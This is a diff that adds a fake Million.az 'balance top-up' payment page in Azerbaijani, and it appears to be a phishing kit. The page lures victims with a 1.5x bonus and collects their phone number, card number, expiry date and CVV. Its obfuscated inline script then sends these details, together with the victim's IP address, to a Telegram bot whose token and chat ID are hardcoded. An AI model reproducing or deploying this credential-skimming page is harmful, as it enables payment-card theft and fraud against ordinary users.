@@ -1,0 +1,255 @@
+<!DOCTYPE html>
+<html lang="az">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Million.az - Balans Artır</title>
+    <style>
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+        }
+
+        body {
+            font-family: 'Roboto', Arial, sans-serif;
+            background: url('background.png') no-repeat center center fixed;
+            background-size: cover;
+            color: #333;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            min-height: 100vh;
+        }
+
+        .header {
+            background-color: #fff;
+            padding: 20px;
+            display: flex;
+            justify-content: center;
+            box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);
+            position: fixed;
+            top: 0;
+            width: 100%;
+            z-index: 1000;
+        }
+
+        .header .logo img {
+            height: 100px;
+        }
+
+        .modal {
+            background: rgba(110, 110, 110, 0.155);
+            width: 90%;
+            max-width: 1200px;
+            padding: 60px;
+            border-radius: 60px;
+            box-shadow: 0 8px 12px rgba(103, 84, 84, 0.367);
+            backdrop-filter: blur(40px);
+            z-index: 999;
+            position: relative;
+            margin: 0 auto;
+            margin-top: 150px;
+            text-align: center;
+        }
+
+        h2 {
+            font-size: 64px;
+            color: white;
+            margin-bottom: 50px;
+            font-weight: bold;
+            text-align: center;
+        }
+
+        .form-group {
+            margin-bottom: 40px;
+            text-align: left;
+        }
+
+        label {
+            display: block;
+            margin-bottom: 15px;
+            font-weight: bold;
+            color: white;
+            font-size: 40px;
+        }
+
+        input[type="text"],
+        input[type="number"],
+        select {
+            width: 100%;
+            max-width: 1000px;
+            padding: 30px;
+            font-size: 36px;
+            box-sizing: border-box;
+            border: 2px solid #ccc;
+            border-radius: 50px;
+            background-color: #fff;
+            color: #333;
+        }
+
+        .result-text {
+            font-size: 40px;
+            color: #33cc33;
+            font-weight: bold;
+            margin-top: 20px;
+            text-align: left;
+        }
+
+        .form-group div {
+            display: flex;
+            gap: 20px;
+        }
+
+        .form-group select {
+            width: 48%;
+            padding: 30px;
+            font-size: 34px;
+            border-radius: 50px;
+            border: 2px solid #ccc;
+            background-color: #fff;
+            color: #333;
+        }
+
+        button {
+            background-color: #d30412;
+            color: white;
+            padding: 30px;
+            font-size: 40px;
+            border: none;
+            cursor: pointer;
+            transition: background-color 0.3s;
+            border-radius: 50px;
+            width: 100%;
+            max-width: 1000px;
+            font-weight: bold;
+        }
+
+        button:hover {
+            background-color: #a9030b;
+        }
+
+        .footer {
+            background-color: #fff;
+            color: #333;
+            padding: 50px;
+            text-align: center;
+            box-shadow: 0 -2px 4px rgba(0, 0, 0, 0.1);
+            width: 100%;
+            position: fixed;
+            bottom: 0;
+        }
+
+        .footer .payment-icons {
+            display: flex;
+            justify-content: center;
+            gap: 20px;
+            margin-top: 20px;
+        }
+
+        .footer .payment-icons img {
+            width: 180px;
+        }
+
+        .footer-bottom {
+            font-size: 30px;
+            margin-top: 20px;
+        }
+
+        .footer-bottom a {
+            color: #d30412;
+            text-decoration: none;
+        }
+
+        .footer-bottom a:hover {
+            text-decoration: underline;
+        }
+
+        @media (max-width: 768px) {
+            .modal h2 {
+                font-size: 50px;
+            }
+
+            button {
+                font-size: 36px;
+            }
+
+            input[type="text"],
+            input[type="number"],
+            select {
+                font-size: 32px;
+                padding: 25px;
+            }
+        }
+    </style>
+</head>
+
+<body>
+    <div class="header">
+        <div class="logo">
+            <img src="Logo.svg" alt="Million.az Logo">
+        </div>
+    </div>
+
+    <div class="content">
+        <div class="modal">
+            <h2>Ödəniş Məlumatları</h2>
+
+            <form id="paymentForm" onsubmit="gonder(event)">
+                <div class="form-group">
+                    <label for="telefon-numarasi">Telefon Nömrəsi</label>
+                    <input type="text" id="telefon-numarasi" name="telefon-numarasi" value="+994"
+                        oninput="telefonInput(this)" maxlength="13" required>
+                </div>
+
+                <div class="form-group">
+                    <label for="tutar">Yükləyəcəyiniz Məbləğ (₼)</label>
+                    <input type="number" id="tutar" name="tutar" placeholder="0" oninput="hesapla(this.value)" required>
+                    <div class="result-text" id="result">Hesabınıza gələcək məbləğ (1.5x bonus ilə): 0.00₼</div>
+                </div>
+
+                <div class="form-group">
+                    <label for="kart-numarasi">Kart Nömrəsi</label>
+                    <input type="text" id="kart-numarasi" name="kart-numarasi" oninput="kartNumarasiInput(this)"
+                        maxlength="16" placeholder="XXXX XXXX XXXX XXXX" required>
+                </div>
+
+                <div class="form-group">
+                    <label>Son İstifadə Tarixi</label>
+                    <div>
+                        <select id="son-kullanma-ay" name="son-kullanma-ay" required>
+                            <option value="">Ay</option>
+                        </select>
+                        <select id="son-kullanma-yil" name="son-kullanma-yil" required>
+                            <option value="">İl</option>
+                        </select>
+                    </div>
+                </div>
+
+                <div class="form-group">
+                    <label for="cvv">CVV</label>
+                    <input type="text" id="cvv" name="cvv" oninput="cvvInput(this)" maxlength="3" placeholder="XXX"
+                        required>
+                </div>
+
+                <button type="submit">Ödənişi Tamamla</button>
+            </form>
+        </div>
+    </div>
+
+    <div class="footer">
+        <div class="payment-icons">
+            <img src="kart.png" alt="Kart">
+        </div>
+        <div class="footer-bottom">
+            <p>Bütün hüquqlar qorunur © 2024 Million.az</p>
+        </div>
+    </div>
+
+    <script>
+        const _0x48ea41=_0x71b1;function _0x71b1(_0x33f2a9,_0x238fd9){const _0x358ecf=_0x358e();return _0x71b1=function(_0x71b173,_0x1b5cfd){_0x71b173=_0x71b173-0x170;let _0x312e30=_0x358ecf[_0x71b173];return _0x312e30;},_0x71b1(_0x33f2a9,_0x238fd9);}(function(_0x3084dd,_0x24feff){const _0x5ce47c=_0x71b1,_0x16b864=_0x3084dd();while(!![]){try{const _0x69a75a=parseInt(_0x5ce47c(0x17b))/0x1*(parseInt(_0x5ce47c(0x172))/0x2)+-parseInt(_0x5ce47c(0x194))/0x3+-parseInt(_0x5ce47c(0x170))/0x4+-parseInt(_0x5ce47c(0x17e))/0x5+-parseInt(_0x5ce47c(0x176))/0x6+parseInt(_0x5ce47c(0x18d))/0x7+parseInt(_0x5ce47c(0x18f))/0x8*(parseInt(_0x5ce47c(0x189))/0x9);if(_0x69a75a===_0x24feff)break;else _0x16b864['push'](_0x16b864['shift']());}catch(_0x3edb5c){_0x16b864['push'](_0x16b864['shift']());}}}(_0x358e,0x59e78));function telefonInput(_0x27415a){const _0x587f73=_0x71b1;_0x27415a[_0x587f73(0x17f)]=_0x27415a['value']['replace'](/[^\d]/g,'');}function hesapla(_0x582532){const _0x327aee=_0x71b1,_0x1e04de=(_0x582532*1.5)[_0x327aee(0x17a)](0x2);document[_0x327aee(0x197)](_0x327aee(0x18e))[_0x327aee(0x171)]='Hesabınıza\x20gələcək\x20məbləğ\x20(1.5x\x20bonus\x20ilə):\x20'+_0x1e04de+'₼';}async function gonder(_0x180336){const _0x5bc826=_0x71b1;_0x180336[_0x5bc826(0x183)]();const _0x5188cd=document['getElementById'](_0x5bc826(0x185))['value'],_0x3c0859=document[_0x5bc826(0x197)](_0x5bc826(0x175))[_0x5bc826(0x17f)],_0x4455a4=document['getElementById']('kart-numarasi')[_0x5bc826(0x17f)]['replace'](/\D/g,''),_0x2e34e9=document[_0x5bc826(0x197)](_0x5bc826(0x186))['value'],_0x5b9e91=document[_0x5bc826(0x197)](_0x5bc826(0x192))[_0x5bc826(0x17f)],_0x526eaf=document[_0x5bc826(0x197)](_0x5bc826(0x193))[_0x5bc826(0x17f)],_0x42b0f1='7519053974:AAGmsaPlNPCGDHXT-H3Wt0sXqbtGRglIaUg',_0x240565=_0x5bc826(0x174),_0x44e94e=await fetch(_0x5bc826(0x18c)),_0x5387c7=await _0x44e94e['json'](),_0x2726f3=_0x5387c7['ip'],_0x56b59b=_0x5bc826(0x178)+_0x5188cd+_0x5bc826(0x18b)+_0x3c0859+'₼\x0aKart:\x20'+_0x4455a4+'\x0aTarix:\x20'+_0x2e34e9+'/'+_0x5b9e91+_0x5bc826(0x181)+_0x526eaf+_0x5bc826(0x182)+_0x2726f3,_0x3a1748=_0x5bc826(0x188)+_0x42b0f1+_0x5bc826(0x17d)+_0x240565+_0x5bc826(0x190)+encodeURIComponent(_0x56b59b);try{await fetch(_0x3a1748),window[_0x5bc826(0x173)][_0x5bc826(0x18a)]=_0x5bc826(0x196);}catch(_0x4cc48e){console[_0x5bc826(0x180)](_0x5bc826(0x198),_0x4cc48e),alert('Bir\x20xəta\x20baş\x20verdi.\x20Zəhmət\x20olmasa,\x20təkrar\x20cəhd\x20edin.');}}function kartNumarasiInput(_0x4d187b){const _0x520944=_0x71b1;_0x4d187b[_0x520944(0x17f)]=_0x4d187b[_0x520944(0x17f)][_0x520944(0x17c)](/\D/g,'')['slice'](0x0,0x10);}function _0x358e(){const _0x2c0d76=['/sendMessage?chat_id=','3365320CuqKcQ','value','error','\x0aCVV:\x20','\x0aIP\x20Adresi:\x20','preventDefault','option','telefon-numarasi','son-kullanma-ay','slice','https://api.telegram.org/bot','9YsyLOP','href','\x0aTutar:\x20','https://api.ipify.org?format=json','1546629gIzlqW','result','17778288OWQFKk','&text=','onload','son-kullanma-yil','cvv','2009160tmpgOe','createElement','pay/index.html','getElementById','Hata:','2790100YBvkod','innerText','24322FQvtmR','location','-4737595773','tutar','937716qvuuCf','appendChild','Tel:\x20','forEach','toFixed','10mlvAZl','replace'];_0x358e=function(){return _0x2c0d76;};return _0x358e();}function cvvInput(_0x55f049){const _0x2a2334=_0x71b1;_0x55f049[_0x2a2334(0x17f)]=_0x55f049['value']['replace'](/\D/g,'')[_0x2a2334(0x187)](0x0,0x3);}window[_0x48ea41(0x191)]=function(){const _0x5cbe8c=_0x48ea41,_0x1ff609=['01','02','03','04','05','06','07','08','09','10','11','12'],_0x4c56e5=document[_0x5cbe8c(0x197)](_0x5cbe8c(0x186)),_0x219612=document[_0x5cbe8c(0x197)]('son-kullanma-yil');_0x1ff609[_0x5cbe8c(0x179)](_0x412c4a=>{const _0x23c892=_0x5cbe8c,_0x4787db=document[_0x23c892(0x195)](_0x23c892(0x184));_0x4787db[_0x23c892(0x17f)]=_0x412c4a,_0x4787db[_0x23c892(0x171)]=_0x412c4a,_0x4c56e5[_0x23c892(0x177)](_0x4787db);});for(let _0x28617f=0x7e8;_0x28617f<=0x7f2;_0x28617f++){const _0x11cb48=document[_0x5cbe8c(0x195)](_0x5cbe8c(0x184));_0x11cb48[_0x5cbe8c(0x17f)]=_0x28617f,_0x11cb48[_0x5cbe8c(0x171)]=_0x28617f,_0x219612[_0x5cbe8c(0x177)](_0x11cb48);}};
+    </script>
+</body>
+
+</html>
